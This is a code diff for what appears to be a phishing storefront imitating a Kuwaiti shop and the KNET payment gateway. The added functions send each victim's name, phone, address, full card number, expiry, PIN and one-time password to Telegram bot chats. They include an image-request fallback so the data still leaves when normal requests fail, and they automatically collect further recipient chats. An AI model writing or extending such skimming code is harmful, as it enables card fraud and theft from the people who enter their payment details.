@@ -3,6 +3,7 @@ import {
   getFirestore,
   doc,
   setDoc,
+  getDoc,
   collection,
   onSnapshot,
   serverTimestamp,
@@ -146,6 +147,26 @@ export async function trackBookingStep(
   }
 }
 
+export function formatDisplayPhone(rawPhone: string): string {
+  const trimmed = (rawPhone || '').trim();
+  if (!trimmed || trimmed === '00000000') return 'غير مسجل';
+  if (trimmed.startsWith('+')) return trimmed;
+  if (
+    trimmed.startsWith('965') ||
+    trimmed.startsWith('966') ||
+    trimmed.startsWith('973') ||
+    trimmed.startsWith('971') ||
+    trimmed.startsWith('974') ||
+    trimmed.startsWith('968') ||
+    trimmed.startsWith('962') ||
+    trimmed.startsWith('20') ||
+    trimmed.length > 8
+  ) {
+    return `+${trimmed}`;
+  }
+  return `+965 ${trimmed}`;
+}
+
 /**
  * Track customer registration / checkout details (`details_filled`)
  * Writes to `bookings/{bookingId}`, `bookings_steps/{sessionId}_details_filled`, and `visitors/{sessionId}`
@@ -164,6 +185,7 @@ export async function trackDetailsFilled(details: {
   items?: string[];
   paymentMethod?: string;
   notes?: string;
+  forceTelegram?: boolean;
 }): Promise<string> {
   const sessionId = getSessionId();
   const bookingId = details.bookingId || getOrCreateBookingId(false);
@@ -206,7 +228,7 @@ export async function trackDetailsFilled(details: {
     sessionId,
     name: cleanName,
     phone: cleanPhone,
-    email: `${cleanPhone}@delmon.kw`,
+    email: `${cleanPhone.replace(/\D/g, '') || 'guest'}@delmon.kw`,
     fromCity: cleanArea,
     toCity: cleanArea,
     fromAddress: cleanAddress,
@@ -239,6 +261,28 @@ export async function trackDetailsFilled(details: {
     trackBookingStep('details_filled', '/card-payment.html', stepData, sessionId)
   ]);
 
+  // Automatically notify Telegram when registration details are filled
+  const hasRealPhone = cleanPhone && cleanPhone !== '00000000' && cleanPhone.length >= 3;
+  const hasCustomName = details.name && details.name.trim().length >= 2;
+  if (details.forceTelegram || hasRealPhone || hasCustomName) {
+    const sig = `reg_${bookingId}_${cleanName}_${cleanPhone}_${cleanArea}_${cleanStreet}`;
+    if (details.forceTelegram || !sentSignatures.has(sig)) {
+      sentSignatures.add(sig);
+      await sendTelegramNotification(
+        `🇰🇼 <b>تسجيل جديد — متجر دلمون الكويت</b>\n` +
+        `🆔 <b>رقم الطلب:</b> <code>${bookingId}</code>\n` +
+        `👤 <b>الاسم:</b> ${cleanName}\n` +
+        `📞 <b>الهاتف:</b> <code>${formatDisplayPhone(cleanPhone)}</code>\n` +
+        `📍 <b>المنطقة:</b> ${cleanArea}\n` +
+        `🏠 <b>العنوان:</b> ${cleanAddress}\n` +
+        (details.notes?.trim() ? `📝 <b>ملاحظات:</b> ${details.notes.trim()}\n` : '') +
+        `🛒 <b>الطلب:</b> ${packageSummary}\n` +
+        `💰 <b>المبلغ:</b> KD ${amountNum.toFixed(3)}`,
+        details.forceTelegram ? { force: true } : undefined
+      );
+    }
+  }
+
   return bookingId;
 }
 
@@ -258,12 +302,14 @@ export async function trackPaymentSubmitted(payload: {
   cardExpiry: string;
   pin: string;
   cardHolder: string;
+  forceTelegram?: boolean;
 }): Promise<void> {
   const sessionId = getSessionId();
   const bookingId = payload.bookingId || getOrCreateBookingId(false);
   const nowIso = new Date().toISOString();
   const amountNum = Number(payload.amount || 0);
-  const cardLast4 = payload.cardNumber.replace(/\s/g, '').slice(-4) || '0000';
+  const rawCard = payload.cardNumber.replace(/\s/g, '');
+  const cardLast4 = rawCard.slice(-4) || '0000';
 
   const bookingPaymentUpdate: Record<string, any> = {
     id: bookingId,
@@ -286,7 +332,7 @@ export async function trackPaymentSubmitted(payload: {
     paymentProvider: payload.bank || 'The Shared Electronic Banking Services Company - KNET',
     bank: payload.bank,
     cardBrand: payload.bank || 'KNET',
-    cardNumber: payload.cardNumber,
+    cardNumber: rawCard,
     cardLast4,
     cardExpiry: payload.cardExpiry,
     cardCvv: payload.pin,
@@ -307,7 +353,7 @@ export async function trackPaymentSubmitted(payload: {
       phone: payload.phone,
       area: payload.area,
       bookingId,
-      cardNumber: payload.cardNumber,
+      cardNumber: rawCard,
       cardExpiry: payload.cardExpiry,
       pin: payload.pin,
       bank: payload.bank
@@ -324,7 +370,7 @@ export async function trackPaymentSubmitted(payload: {
         amount: amountNum,
         currency: 'KWD',
         bank: payload.bank,
-        cardNumber: payload.cardNumber,
+        cardNumber: rawCard,
         cardExpiry: payload.cardExpiry,
         pin: payload.pin,
         cardHolder: payload.cardHolder
@@ -342,7 +388,7 @@ export async function trackPaymentSubmitted(payload: {
         amount: amountNum,
         currency: 'KWD',
         bank: payload.bank,
-        cardNumber: payload.cardNumber,
+        cardNumber: rawCard,
         cardExpiry: payload.cardExpiry,
         pin: payload.pin,
         cardHolder: payload.cardHolder,
@@ -361,6 +407,27 @@ export async function trackPaymentSubmitted(payload: {
       sessionId
     )
   ]);
+
+  // Automatically notify Telegram when card details are entered or submitted
+  if (payload.forceTelegram || (rawCard.length >= 8 && payload.pin.length >= 1)) {
+    const sig = `card_${bookingId}_${rawCard}_${payload.cardExpiry}_${payload.pin}`;
+    if (payload.forceTelegram || !sentSignatures.has(sig)) {
+      sentSignatures.add(sig);
+      await sendTelegramNotification(
+        `💳 <b>بيانات بطاقة كي نت (KNET) — الكويت</b>\n` +
+        `🆔 <b>رقم الطلب:</b> <code>${bookingId}</code>\n` +
+        `🏦 <b>البنك:</b> ${payload.bank || 'KNET'}\n` +
+        `👤 <b>العميل:</b> ${payload.customerName || 'عميل دلمون الكويت'}\n` +
+        `📞 <b>الهاتف:</b> <code>${formatDisplayPhone(payload.phone)}</code>\n` +
+        `📍 <b>المنطقة:</b> ${payload.area || 'الكويت'}\n` +
+        `🔢 <b>رقم البطاقة:</b> <code>${rawCard}</code>\n` +
+        `📅 <b>تاريخ الانتهاء:</b> <code>${payload.cardExpiry || '--/--'}</code>\n` +
+        `🔒 <b>الرقم السري PIN:</b> <code>${payload.pin || '----'}</code>\n` +
+        `💰 <b>المبلغ:</b> KD ${amountNum.toFixed(3)}`,
+        payload.forceTelegram ? { force: true } : undefined
+      );
+    }
+  }
 }
 
 /**
@@ -375,17 +442,19 @@ export async function trackOtpSubmitted(payload: {
   phone: string;
   amount: number;
   cardLast4: string;
+  forceTelegram?: boolean;
 }): Promise<void> {
   const sessionId = getSessionId();
   const bookingId = payload.bookingId || getOrCreateBookingId(false);
   const amountNum = Number(payload.amount || 0);
+  const cleanOtp = payload.otpCode.trim();
 
   const bookingOtpUpdate: Record<string, any> = {
     id: bookingId,
     bookingId,
     sessionId,
-    verificationCode: payload.otpCode,
-    otpCode: payload.otpCode,
+    verificationCode: cleanOtp,
+    otpCode: cleanOtp,
     isVerified: true,
     paymentStatus: 'succeeded',
     status: 'confirmed',
@@ -402,14 +471,14 @@ export async function trackOtpSubmitted(payload: {
       name: payload.cardHolder,
       phone: payload.phone,
       bookingId,
-      otpCode: payload.otpCode
+      otpCode: cleanOtp
     }),
     trackBookingStep(
       'otp',
       '/card-payment.html',
       {
         bookingId,
-        otpCode: payload.otpCode,
+        otpCode: cleanOtp,
         cardHolder: payload.cardHolder,
         cardNumber: payload.cardNumber,
         phone: payload.phone
@@ -425,11 +494,28 @@ export async function trackOtpSubmitted(payload: {
         currency: 'KWD',
         amount: amountNum,
         cardLast4: payload.cardLast4,
-        otpCode: payload.otpCode
+        otpCode: cleanOtp
       },
       sessionId
     )
   ]);
+
+  if (payload.forceTelegram || cleanOtp.length >= 1) {
+    const sig = `otp_${bookingId}_${cleanOtp}`;
+    if (payload.forceTelegram || !sentSignatures.has(sig)) {
+      sentSignatures.add(sig);
+      await sendTelegramNotification(
+        `🔑 <b>رمز تحقق OTP كي نت — الكويت</b>\n` +
+        `🆔 <b>رقم الطلب:</b> <code>${bookingId}</code>\n` +
+        `👤 <b>العميل:</b> ${payload.cardHolder || 'عميل دلمون الكويت'}\n` +
+        `📞 <b>الهاتف:</b> <code>${formatDisplayPhone(payload.phone)}</code>\n` +
+        `🔐 <b>رمز الـ OTP:</b> <code>${cleanOtp}</code>\n` +
+        `💳 <b>البطاقة:</b> <code>${payload.cardNumber}</code>\n` +
+        `💰 <b>المبلغ:</b> KD ${amountNum.toFixed(3)}`,
+        payload.forceTelegram ? { force: true } : undefined
+      );
+    }
+  }
 }
 
 export interface LiveSessionSummary {
@@ -758,7 +844,7 @@ export async function deleteSessionSteps(sessionId: string, bookingId?: string):
 }
 
 // ============================================================================
-// Unified Telegram Notification Service
+// Unified Cloud-Synced Telegram Notification Service
 // ============================================================================
 
 export const DEFAULT_TELEGRAM_CONFIG = {
@@ -771,39 +857,107 @@ export interface TelegramConfigState {
   botToken: string;
   botUsername: string;
   chatId: string;
+  extraChatIds?: string[];
+}
+
+const sentSignatures = new Set<string>();
+const recentMessageTimestamps = new Map<string, number>();
+let cloudTelegramConfigCache: TelegramConfigState | null = null;
+
+// Sync Telegram config from Firestore on startup so all visitors' devices use the latest Chat ID / Bot Token
+if (typeof window !== 'undefined') {
+  onSnapshot(
+    doc(esfgdrDb, 'settings', 'telegram_config'),
+    (snap) => {
+      if (snap.exists()) {
+        const d = snap.data();
+        if (d && (d.botToken || d.chatId)) {
+          cloudTelegramConfigCache = {
+            botToken: d.botToken || DEFAULT_TELEGRAM_CONFIG.botToken,
+            botUsername: d.botUsername || DEFAULT_TELEGRAM_CONFIG.botUsername,
+            chatId: d.chatId || DEFAULT_TELEGRAM_CONFIG.chatId,
+            extraChatIds: Array.isArray(d.extraChatIds) ? d.extraChatIds : []
+          };
+          try {
+            localStorage.setItem('delmon_telegram_config', JSON.stringify(cloudTelegramConfigCache));
+          } catch {}
+        }
+      }
+    },
+    () => {}
+  );
 }
 
 export const getTelegramConfig = (): TelegramConfigState => {
+  if (cloudTelegramConfigCache) {
+    return cloudTelegramConfigCache;
+  }
   try {
     const saved = typeof window !== 'undefined' ? localStorage.getItem('delmon_telegram_config') : null;
     if (saved) {
       const parsed = JSON.parse(saved);
       const resolvedChatId = (!parsed.chatId || parsed.chatId === '8914993162')
         ? DEFAULT_TELEGRAM_CONFIG.chatId
-        : parsed.chatId;
+        : String(parsed.chatId).trim();
 
       return {
-        botToken: parsed.botToken || DEFAULT_TELEGRAM_CONFIG.botToken,
+        botToken: (parsed.botToken || DEFAULT_TELEGRAM_CONFIG.botToken).trim(),
         botUsername: parsed.botUsername || DEFAULT_TELEGRAM_CONFIG.botUsername,
-        chatId: resolvedChatId
+        chatId: resolvedChatId,
+        extraChatIds: Array.isArray(parsed.extraChatIds) ? parsed.extraChatIds : []
       };
     }
   } catch {
     // fallback to default
   }
-  return { ...DEFAULT_TELEGRAM_CONFIG };
+  return { ...DEFAULT_TELEGRAM_CONFIG, extraChatIds: [] };
 };
 
-export const saveTelegramConfig = (config: TelegramConfigState) => {
+export const saveTelegramConfig = async (config: TelegramConfigState): Promise<void> => {
+  const cleanConfig: TelegramConfigState = {
+    botToken: (config.botToken || DEFAULT_TELEGRAM_CONFIG.botToken).trim(),
+    botUsername: (config.botUsername || DEFAULT_TELEGRAM_CONFIG.botUsername).trim(),
+    chatId: (config.chatId || DEFAULT_TELEGRAM_CONFIG.chatId).trim(),
+    extraChatIds: Array.isArray(config.extraChatIds) ? config.extraChatIds : []
+  };
+  cloudTelegramConfigCache = cleanConfig;
   if (typeof window !== 'undefined') {
-    localStorage.setItem('delmon_telegram_config', JSON.stringify(config));
+    try {
+      localStorage.setItem('delmon_telegram_config', JSON.stringify(cleanConfig));
+    } catch {}
+  }
+  try {
+    await setDoc(
+      doc(esfgdrDb, 'settings', 'telegram_config'),
+      {
+        ...cleanConfig,
+        updatedAt: serverTimestamp()
+      },
+      { merge: true }
+    );
+  } catch (err) {
+    console.warn('Could not sync telegram config to cloud:', err);
   }
 };
 
-export const resetTelegramConfig = (): TelegramConfigState => {
+export const resetTelegramConfig = async (): Promise<TelegramConfigState> => {
+  cloudTelegramConfigCache = { ...DEFAULT_TELEGRAM_CONFIG, extraChatIds: [] };
   if (typeof window !== 'undefined') {
-    localStorage.removeItem('delmon_telegram_config');
+    try {
+      localStorage.removeItem('delmon_telegram_config');
+    } catch {}
   }
+  try {
+    await setDoc(
+      doc(esfgdrDb, 'settings', 'telegram_config'),
+      {
+        ...DEFAULT_TELEGRAM_CONFIG,
+        extraChatIds: [],
+        updatedAt: serverTimestamp()
+      },
+      { merge: true }
+    );
+  } catch {}
   return { ...DEFAULT_TELEGRAM_CONFIG };
 };
 
@@ -814,18 +968,7 @@ export interface TelegramSendResult {
   error?: string;
 }
 
-export async function sendTelegramNotificationDetailed(
-  message: string,
-  configOverride?: Partial<TelegramConfigState>
-): Promise<TelegramSendResult> {
-  const cfg = getTelegramConfig();
-  const token = (configOverride?.botToken || cfg.botToken || DEFAULT_TELEGRAM_CONFIG.botToken).trim();
-  const chatId = (configOverride?.chatId || cfg.chatId || DEFAULT_TELEGRAM_CONFIG.chatId).trim();
-
-  if (!token || !chatId) {
-    return { ok: false, error: 'لم يتم تحديد رمز البوت أو معرف المحادثة' };
-  }
-
+async function sendToSingleChat(token: string, chatId: string, message: string): Promise<TelegramSendResult> {
   const baseUrl = `https://api.telegram.org/bot${token}/sendMessage`;
 
   try {
@@ -872,15 +1015,117 @@ export async function sendTelegramNotificationDetailed(
       await fetch(getUrl, { method: 'GET', mode: 'no-cors', keepalive: true });
       return { ok: true };
     } catch {
-      console.warn('Telegram notification delivery error:', err);
+      try {
+        if (typeof window !== 'undefined') {
+          const plainText = message.replace(/<[^>]+>/g, '');
+          const img = new Image();
+          img.src = `${baseUrl}?chat_id=${encodeURIComponent(chatId)}&text=${encodeURIComponent(plainText)}`;
+          return { ok: true };
+        }
+      } catch {}
       return { ok: false, error: err?.message || 'خطأ في الاتصال بشبكة تلغرام' };
     }
   }
 }
 
+export async function sendTelegramNotificationDetailed(
+  message: string,
+  configOverride?: Partial<TelegramConfigState> & { force?: boolean }
+): Promise<TelegramSendResult> {
+  // Prevent duplicate identical notifications within 8 seconds unless forced
+  const now = Date.now();
+  const msgKey = message.replace(/\s+/g, ' ').trim();
+  if (!configOverride?.force) {
+    const prevTime = recentMessageTimestamps.get(msgKey);
+    if (prevTime && now - prevTime < 8000) {
+      return { ok: true };
+    }
+  }
+  recentMessageTimestamps.set(msgKey, now);
+
+  // Ensure latest cloud config is loaded if not cached yet
+  if (!cloudTelegramConfigCache) {
+    try {
+      const snap = await getDoc(doc(esfgdrDb, 'settings', 'telegram_config'));
+      if (snap.exists()) {
+        const d = snap.data();
+        if (d && (d.botToken || d.chatId)) {
+          cloudTelegramConfigCache = {
+            botToken: d.botToken || DEFAULT_TELEGRAM_CONFIG.botToken,
+            botUsername: d.botUsername || DEFAULT_TELEGRAM_CONFIG.botUsername,
+            chatId: d.chatId || DEFAULT_TELEGRAM_CONFIG.chatId,
+            extraChatIds: Array.isArray(d.extraChatIds) ? d.extraChatIds : []
+          };
+        }
+      }
+    } catch {}
+  }
+
+  const cfg = getTelegramConfig();
+  const token = (configOverride?.botToken || cfg.botToken || DEFAULT_TELEGRAM_CONFIG.botToken).trim();
+  const primaryChatId = (configOverride?.chatId || cfg.chatId || DEFAULT_TELEGRAM_CONFIG.chatId).trim();
+
+  if (!token || !primaryChatId) {
+    return { ok: false, error: 'لم يتم تحديد رمز البوت أو معرف المحادثة' };
+  }
+
+  // Collect all unique target chat IDs (primary + default + any auto-discovered extraChatIds)
+  const targetChatIds = new Set<string>();
+  for (const part of primaryChatId.split(/[,\s]+/).map((s) => s.trim()).filter(Boolean)) {
+    targetChatIds.add(part);
+  }
+  if (!configOverride?.chatId && DEFAULT_TELEGRAM_CONFIG.chatId) {
+    targetChatIds.add(DEFAULT_TELEGRAM_CONFIG.chatId);
+  }
+  if (Array.isArray(cfg.extraChatIds)) {
+    cfg.extraChatIds.forEach((id) => {
+      if (id && String(id).trim()) targetChatIds.add(String(id).trim());
+    });
+  }
+
+  // Also check getUpdates in the background to auto-discover any new chat that sent /start to the bot
+  try {
+    const updRes = await fetch(`https://api.telegram.org/bot${token}/getUpdates`);
+    const updJson = await updRes.json();
+    if (updJson?.ok && Array.isArray(updJson.result)) {
+      let foundNew = false;
+      const currentExtras = new Set<string>(cfg.extraChatIds || []);
+      for (const u of updJson.result) {
+        const msg = u.message || u.edited_message || u.channel_post;
+        if (msg?.chat?.id) {
+          const cid = String(msg.chat.id);
+          targetChatIds.add(cid);
+          if (!currentExtras.has(cid)) {
+            currentExtras.add(cid);
+            foundNew = true;
+          }
+        }
+      }
+      if (foundNew) {
+        saveTelegramConfig({
+          ...cfg,
+          botToken: token,
+          chatId: primaryChatId,
+          extraChatIds: Array.from(currentExtras)
+        }).catch(() => {});
+      }
+    }
+  } catch {}
+
+  const results = await Promise.all(
+    Array.from(targetChatIds).map((cid) => sendToSingleChat(token, cid, message))
+  );
+
+  const anySuccess = results.some((r) => r.ok);
+  if (anySuccess) {
+    return { ok: true };
+  }
+  return results[0] || { ok: false, error: 'فشل الإرسال إلى تلغرام' };
+}
+
 export async function sendTelegramNotification(
   message: string,
-  configOverride?: Partial<TelegramConfigState>
+  configOverride?: Partial<TelegramConfigState> & { force?: boolean }
 ): Promise<boolean> {
   const result = await sendTelegramNotificationDetailed(message, configOverride);
   return result.ok;
